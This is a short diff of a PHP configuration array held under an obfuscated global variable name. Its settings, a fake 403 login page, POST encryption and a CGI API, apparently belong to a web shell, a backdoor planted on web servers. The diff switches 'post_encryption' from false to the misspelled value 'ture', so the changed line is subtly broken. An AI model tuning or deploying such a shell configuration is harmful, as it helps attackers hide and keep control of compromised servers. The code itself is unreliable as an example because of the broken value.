@@ -5,7 +5,7 @@ $GLOBALS['oZgNypoPRU'] = array(
     'safe_mode' => '0',
     'login_page' => '403',
     'show_icons' => '1',
-    'post_encryption' => false,
+    'post_encryption' => ture,
     'cgi_api' => true,
 );
 
